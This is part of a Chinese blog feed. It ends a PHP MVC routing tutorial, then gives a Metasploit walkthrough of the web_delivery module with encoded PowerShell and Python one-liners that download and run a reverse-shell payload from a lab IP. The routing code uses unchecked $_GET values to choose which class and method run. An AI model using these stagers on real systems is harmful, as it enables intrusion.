class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$a();</span><br></pre></td></tr></table></figure><h4 id="初始类实现"><a href="#初始类实现" class="headerlink" title="初始类实现"></a>初始类实现</h4><p>就是把我们上面的index文件的所有功能初始化一个类。最后直接在index调用类即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义最终的框架初始类</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Frame</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//公共的静态的框架初始化方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">self</span>::initConfig();<span class="comment">//初始化配置信息</span></span><br><span class="line"><span class="built_in">self</span>::initRoute();<span class="comment">//初始化路由参数</span></span><br><span class="line"><span class="built_in">self</span>::initConst();<span class="comment">//初始化目录常量</span></span><br><span class="line"><span class="built_in">self</span>::initAutoLoad();<span class="comment">//初始化类的自动加载</span></span><br><span class="line"><span class="built_in">self</span>::initDispatch();<span class="comment">//初始化请求分发</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化配置信息</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initConfig</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">&#x27;config&#x27;</span>] = <span class="keyword">require_once</span>(<span class="string">&quot;./App/Conf/Config.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化路由参数</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initRoute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$p = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;p&#x27;</span>]) ? $_GET[<span class="string">&#x27;p&#x27;</span>] : $GLOBALS[<span class="string">&#x27;config&#x27;</span>][<span class="string">&#x27;default_platform&#x27;</span>]; <span class="comment">//平台参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : $GLOBALS[<span class="string">&#x27;config&#x27;</span>][<span class="string">&#x27;default_controller&#x27;</span>]; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : $GLOBALS[<span class="string">&#x27;config&#x27;</span>][<span class="string">&#x27;default_action&#x27;</span>]; <span class="comment">//动作名</span></span><br><span class="line">define(<span class="string">&quot;PLAT&quot;</span>,$p);</span><br><span class="line">define(<span class="string">&quot;CONTROLLER&quot;</span>,$c);</span><br><span class="line">define(<span class="string">&quot;ACTION&quot;</span>,$a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化目录常量</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initConst</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">define(<span class="string">&quot;DS&quot;</span>,DIRECTORY_SEPARATOR); <span class="comment">//动态目录分割符</span></span><br><span class="line">define(<span class="string">&quot;ROOT_PATH&quot;</span>,getcwd().DS); <span class="comment">//当前目录</span></span><br><span class="line">define(<span class="string">&quot;FRAME_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;Frame&quot;</span>.DS); <span class="comment">//Frame目录</span></span><br><span class="line">define(<span class="string">&quot;MODEL_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;Model&quot;</span>.DS); <span class="comment">//Model目录</span></span><br><span class="line">define(<span class="string">&quot;CONTROLLER_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;Controller&quot;</span>.DS); <span class="comment">//Controller目录</span></span><br><span class="line">define(<span class="string">&quot;VIEW_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;View&quot;</span>.DS.CONTROLLER.DS); <span class="comment">//View目录</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化类的自动加载</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initAutoLoad</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//类文件路径数组</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">FRAME_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line">MODEL_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line">CONTROLLER_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//循环数组</span></span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $filename)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果类文件路径存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line"><span class="keyword">echo</span> $filename.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的静态的初始化请求分发：创建哪个控制器类的对象？调用控制器对象的哪个方法？</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">initDispatch</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = CONTROLLER . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$action_name = ACTION;</span><br><span class="line">$controllerObj-&gt;$action_name();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试--Metasploit的使用</title>
      <link href="2019/12/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2019/12/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试–Metasploit的使用"><a href="#渗透测试–Metasploit的使用" class="headerlink" title="渗透测试–Metasploit的使用"></a>渗透测试–Metasploit的使用</h1><h2 id="Metasploit的使用"><a href="#Metasploit的使用" class="headerlink" title="Metasploit的使用"></a>Metasploit的使用</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><ul><li>data</li><li>modules</li><li>scripts</li><li>tools</li><li>plugins</li></ul><h3 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h3><h5 id="modules目录"><a href="#modules目录" class="headerlink" title="modules目录"></a>modules目录</h5><p>位置在<code>/usr/share/metasploit-framework/modules/</code>中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ cd /usr/share/metasploit-framework/modules/</span><br><span class="line">steady@steady:/usr/share/metasploit-framework/modules$ ls</span><br><span class="line">auxiliary  encoders  evasion  exploits  nops  payloads  post</span><br></pre></td></tr></table></figure><h6 id="渗透攻击模块-Exploit"><a href="#渗透攻击模块-Exploit" class="headerlink" title="渗透攻击模块(Exploit)"></a>渗透攻击模块(Exploit)</h6><p>在msf中使用<code>show exploits</code>。</p><p>主动渗透攻击：利用模块中的exp对目标发送数据，利用其已知漏洞。</p><p>被动渗透攻击：利用木马病毒文件，诱导目标运行文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; show exploit</span><br><span class="line">  <span class="number">1543</span>  windows/http/httpdx_handlepeer                                    <span class="number">2009</span><span class="number">-10</span><span class="number">-08</span>       <span class="function">manual  Yes    HTTPDX <span class="title">h_handlepeer</span><span class="params">()</span> Function Buffer Overflow</span></span><br><span class="line">   1544  windows/http/httpdx_tolog_format                                  2009-11-17       manual  Yes    HTTPDX tolog() Function Format String Vulnerability</span><br><span class="line">   <span class="number">1545</span>  windows/http/ia_webmail                                           <span class="number">2003</span><span class="number">-11</span><span class="number">-03</span>       manual  No     IA WebMail <span class="number">3.</span>x Buffer Overflow</span><br><span class="line">   <span class="number">1546</span>  windows/http/ibm_tivoli_endpoint_bof                              <span class="number">2011</span><span class="number">-05</span><span class="number">-31</span>       manual  No     IBM Tivoli Endpoint Manager POST Query Buffer Overflow</span><br><span class="line">   <span class="number">1547</span>  windows/http/ibm_tpmfosd_overflow                                 <span class="number">2007</span><span class="number">-05</span><span class="number">-02</span>       manual  No     IBM TPM <span class="keyword">for</span> OS Deployment <span class="number">5.1</span><span class="number">.0</span>.x rembo.exe Buffer Overflow</span><br><span class="line">   <span class="number">1548</span>  windows/http/ibm_tsm_cad_header                                   <span class="number">2007</span><span class="number">-09</span><span class="number">-24</span>       manual  No     IBM Tivoli Storage Manager Express CAD Service Buffer Overflow</span><br></pre></td></tr></table></figure><h6 id="攻击载荷模块-Payload"><a href="#攻击载荷模块-Payload" class="headerlink" title="攻击载荷模块(Payload)"></a>攻击载荷模块(Payload)</h6><p>在msf中使用<code>show payload</code>。</p><p>对目标机进行攻击后想让目标机执行的代码，比如反弹shell、bind shell等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; show payloads</span><br><span class="line"></span><br><span class="line">Payloads</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">   <span class="comment">#    Name                                                Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -    ----                                                ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline</span><br><span class="line">   <span class="number">1</span>    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline</span><br><span class="line">   <span class="number">2</span>    aix/ppc/shell_interact                                               manual  No     AIX execve Shell <span class="keyword">for</span> inetd</span><br><span class="line">   <span class="number">3</span>    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline</span><br></pre></td></tr></table></figure><h6 id="空指令模块-Nops"><a href="#空指令模块-Nops" class="headerlink" title="空指令模块(Nops)"></a>空指令模块(Nops)</h6><p>不影响程序运行的空指令或无关指令，用于填充。</p><p>使用``show nops`查看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; show nops</span><br><span class="line"></span><br><span class="line">NOP Generators</span><br><span class="line">==============</span><br><span class="line"></span><br><span class="line">   #  Name             Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----             ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>  aarch64/simple                    manual  No     Simple</span><br><span class="line">   <span class="number">1</span>  armle/simple                      manual  No     Simple</span><br><span class="line">   <span class="number">2</span>  mipsbe/better                     manual  No     Better</span><br><span class="line">   <span class="number">3</span>  php/generic                       manual  No     PHP Nop Generator</span><br><span class="line">   <span class="number">4</span>  ppc/simple                        manual  No     Simple</span><br><span class="line">   <span class="number">5</span>  sparc/random                      manual  No     SPARC NOP Generator</span><br><span class="line">   <span class="number">6</span>  tty/generic                       manual  No     TTY Nop Generator</span><br><span class="line">   <span class="number">7</span>  x64/simple                        manual  No     Simple</span><br><span class="line">   <span class="number">8</span>  x86/opty2                         manual  No     Opty2</span><br><span class="line">   <span class="number">9</span>  x86/single_byte                   manual  No     Single Byte</span><br></pre></td></tr></table></figure><h6 id="编码器模块-Encoders"><a href="#编码器模块-Encoders" class="headerlink" title="编码器模块(Encoders)"></a>编码器模块(Encoders)</h6><p>避免”坏字符”的出现，以及免杀处理。</p><p>使用<code>show encoders</code>，查看。</p><h6 id="后渗透攻击模块-posts"><a href="#后渗透攻击模块-posts" class="headerlink" title="后渗透攻击模块(posts)"></a>后渗透攻击模块(posts)</h6><p>使用<code>show post</code>进行查看。</p><p>用以在已经拿到控制权的目标上进行更深层次的渗透。</p><h6 id="辅助模块-Auxiliary"><a href="#辅助模块-Auxiliary" class="headerlink" title="辅助模块(Auxiliary)"></a>辅助模块(Auxiliary)</h6><p>使用<code>show auxiliqry</code>查看。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>选择一个指定的模块并使其开始工作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use[Auxiliary&#x2F;Exploit&#x2F;Payload&#x2F;Encoder]</span><br></pre></td></tr></table></figure><p>显示可用的特定功能的模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show [auxiliary&#x2F;exploit&#x2F;payload&#x2F;encoder&#x2F;options]</span><br></pre></td></tr></table></figure><p>给某个特定的对象赋值 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set [options&#x2F;payload]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run   在设定一个辅助模块需要的所有选项之后，启动该模块 </span><br><span class="line">exploit   启动一个渗透攻击模块 </span><br><span class="line">back      取消当前选择的模块并且退回到上一级命令窗口 </span><br><span class="line">info  列出模块的相关信息 </span><br><span class="line">search    搜索符合条件的特定模块</span><br></pre></td></tr></table></figure><h2 id="msf–web-delivery模块攻击实战操作"><a href="#msf–web-delivery模块攻击实战操作" class="headerlink" title="msf–web_delivery模块攻击实战操作"></a>msf–web_delivery模块攻击实战操作</h2><h3 id="模块简介"><a href="#模块简介" class="headerlink" title="模块简介"></a>模块简介</h3><p>在攻击计算机上创建的服务器上托管有效负载。一旦目标机器连接到服务器并且然后执行有效载荷，则运行web传递脚本。</p><h3 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h3><p>默写情况下，目标系统没有web环境，我们无法使用webshell获取对方shell，但是我们可以进入对方的系统，或者是对方有命令执行的功能，此时可以使用该模块。常见的是站库分离对数据库服务器的渗透以及网站具有命令执行的功能。</p><h3 id="搜索web-delivery模块"><a href="#搜索web-delivery模块" class="headerlink" title="搜索web_delivery模块"></a>搜索web_delivery模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search web_delivery</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                                        Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                        ---------------  ----       -----  -----------</span><br><span class="line">   <span class="number">0</span>  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  <span class="number">2019</span><span class="number">-03</span><span class="number">-20</span>       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution</span><br><span class="line">   <span class="number">1</span>  exploit/multi/script/web_delivery                           <span class="number">2013</span><span class="number">-07</span><span class="number">-19</span>       manual     No     Script Web Delivery</span><br></pre></td></tr></table></figure><h3 id="利用web-delivery模块"><a href="#利用web-delivery模块" class="headerlink" title="利用web_delivery模块"></a>利用web_delivery模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/script/web_delivery):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          yes       The local host to listen on. This must be an address on the local machine <span class="keyword">or</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">   SRVPORT  <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL <span class="keyword">for</span> incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default <span class="keyword">is</span> randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default <span class="keyword">is</span> random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Python</span><br></pre></td></tr></table></figure><h3 id="设置参数"><a href="#设置参数" class="headerlink" title="设置参数"></a>设置参数</h3><p>Php</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target PHP#命令执行的编程语言。</span><br><span class="line">target =&gt; PHP</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; run</span><br></pre></td></tr></table></figure><p>Python</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; python/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target Python#命令执行的编程语言。</span><br><span class="line">target =&gt; PHP</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; run</span><br></pre></td></tr></table></figure><p>在windows下可以设置PowerShell脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">先设置监听payload</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target PSH</span><br><span class="line">target =&gt; PSH</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LPORT <span class="number">3333</span></span><br><span class="line">LPORT =&gt; <span class="number">3333</span></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LHOST <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">LHOST =&gt; <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; run</span><br><span class="line">[*] Exploit running as background job <span class="number">3.</span></span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">172.20</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">3333</span></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; [*] Using URL: http:<span class="comment">//0.0.0.0:8080/DJbXfk9</span></span><br><span class="line">[*] Local IP: http:<span class="comment">//172.20.10.4:8080/DJbXfk9</span></span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABUAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAFQALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABUAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAyADAALgAxADAALgA0ADoAOAAwADgAMAAvAEQASgBiAFgAZgBrADkALwBRAEIATwBPAGsAQwBqAHYARgBLADYAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMgAwAC4AMQAwAC4ANAA6ADgAMAA4ADAALwBEAEoAYgBYAGYAawA5ACcAKQApADsA</span><br></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] Exploit running as background job <span class="number">0.</span></span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">172.20</span><span class="number">.10</span><span class="number">.4</span>:<span class="number">4444</span></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/fqPktunoW9r1Hl</span><br><span class="line">[*] Local IP: http:<span class="comment">//172.20.10.4:8080/fqPktunoW9r1Hl</span></span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">python -c <span class="string">&quot;import sys;import ssl;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://172.20.10.4:8080/fqPktunoW9r1Hl&#x27;, context=ssl._create_unverified_context());exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure><p>将payload在目标机器运行。</p><h3 id="进入目标shell"><a href="#进入目标shell" class="headerlink" title="进入目标shell"></a>进入目标shell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; sessions -l 2</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                      Information      Connection</span><br><span class="line">  --  ----  ----                      -----------      ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter python/linux  steady @ steady  <span 